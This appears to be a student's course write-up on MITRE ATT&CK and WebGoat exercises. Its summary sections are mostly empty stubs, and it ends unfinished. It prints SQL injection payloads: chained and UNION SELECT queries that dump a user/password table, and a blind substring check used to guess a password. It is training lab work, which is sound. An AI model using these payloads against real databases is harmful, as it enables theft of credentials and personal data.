Task 1:

I decided to create another repository with useful vocabulary and definitions that will be extremelly useful for me during the entire class. 

The link is:
https://github.com/AikateriniT/SECURITY-VOCABULARY
____________________________________________________________________________________________
x) Read and summarize (This subtask x does not require tests with a computer. Some bullets per article is enough for your summary, feel free to write more if you like)

    € Costa-Gazcón 2021: Practical Threat Intelligence and Data-Driven Threat Hunting 
    Chapter 4: Mapping the Adversary (all but "Testing yourself", which is left as voluntary bonus)'
    
Chapter 4: Mapping the Adversary.

In the 4th chapter the author explains how to work with the MITRE ATT&CK Framework, and making reports on the topics: - The ATT&CK Framework - Mapping with ATT&CK - Testing ourselves


____________________________________________________________________________________________




____________________________________________________________________________________________
y) Write an answer with references (this subtask does not require tests with a computer). Answer in the context of Mitre Att&ck, and pick examples that are different from the chapter in task x.
Define tactic and give an example.
Define technique and subtechnique, and give an example of each.
Define procedure, and give an example of each.


____________________________________________________________________________________________

____________________________________________________________________________________________
WebGoat Sensitive Data Exposure: Insecure Login
____________________________________________________________________________________________

Encryption is a very important tool for secure communication. Data encryption must always be used when we send sensitive data.

    - Basic understanding of packet sniffer usage
    - The user will be able to intercept and read encrypted requests

____________________________________________________________________________________________
Voluntary:
WebGoat - Injection (advanced)

The goals of this part is to teach the more advanced topics for an SQL injection by combining SQL injection techniques and the Blind SQL injection.

Task 3: Pulling data from other tables.

    CREATE TABLE user_data (userid int not null,
                           first_name varchar(20),
                           last_name varchar(20),
                           cc_number varchar(30),
                           cc_type varchar(10),
                           cookie varchar(20),
                           login_count int
                           );
                           
    CREATE TABLE user_system_data (userid int not null primary key,
                                              user_name varchar(12),
                                              password varchar(10),
                                              cookie varchar(30)
                                              );
 
6.a) Retrieve all data from the table
 
6.b) When you have figured it out... What is Dave's password?
 
For the first attempt we should try chaining and for the second attempt we should try the UNION. From the creation of the tables we already know that they are susceptible to SQL injection. For the chaining we have to think, that we don't know any name from the table (';), then we want to print all the columns included (SELECT *) inside the user_system_data (FROM user_system_data; --) 
So, as a solution we have the:

        '; SELECT * FROM user_system_data; --
        SELECT * FROM user_system_data WHERE last_name = "; SELECT * FROM user_system_data; --
        (that is the query)
        
![1](https://user-images.githubusercontent.com/113516460/217308072-1d4fd3c0-19c4-449f-8f38-a008d4ea7d68.JPG)

Then we will try to figure out how to do it by using UNION. 

    By following the syntax of UNION provided from the last task we do like that:
    ' UNION SELECT 1, user_name, password, cookie, 'A','B', 1 FROM user_system_data;--
    SELECT * FROM user_data WHERE last_name = "UNION SELECT 1, user_name, password, cookie, 'A','B', 
    1 FROM user_system_data;--
    
    
    Hint! he datatype of the first column in the first SELECT statement, must catch the datatype of the first 
    column in the second(third, fourth..) SELECT stetement. The same applies to all other columns. 
    
    The password of Dave is: passW0rD
    
![2](https://user-images.githubusercontent.com/113516460/217311180-76397ea9-0ec0-45b8-9e5f-9b79c1a7b06f.JPG)

Task 5:
_______________________________________________________________________________________________
In this task we must brute force ourselves in the system. We only know that the username is Tom and nothing more. 
I can tell you already that this task took me around 1,5 hour to complete and half a packet of cigarettes. 
But lets see how we will manage to get ourselves in. 

First I tried to log in with any variable but I was always getting an error, that 'no results matched', so then I thought that I might need to register Tom as a user. But to my surprise Tom user already exists. 

Since we are doing 'blind attacks' we gather all the information given. As true, false or error. 
So when we try to add as a user  TOM' AND '1'='1, we receive the message that {0} user already exists. We may get a hint here that the username field is susceptible to SQL injection. 

The other goal is to find out what is the name of the table that the passwords are listed. If this exersice is very basic as I am guessing, then the name of the table might be "password". So I will start a long journey guessing the letters from Tom's password. I will use the statement "User{0} already exists" as a true statement. 

Using the string from the last page and adapting it to the needs of this attempt to log in we have:

    tom' AND substring(password,1,1)='t
    
From this we understand that letter "t" is the first letter of Tom's password. 

Then I couldn't manage to figure our what was happening so I had to watch a long video about how to brute force. From my perspective the material that was given before this assignment was not enough to manage to solve this. NetworkChuck is one of my sources. 

I'll continue the explanation soon!





SOURCES
______________________________________________________________________________________________

https://www.youtube.com/watch?v=2OPVViV-GQk
https://www.youtube.com/watch?v=z4_oqTZJqCo
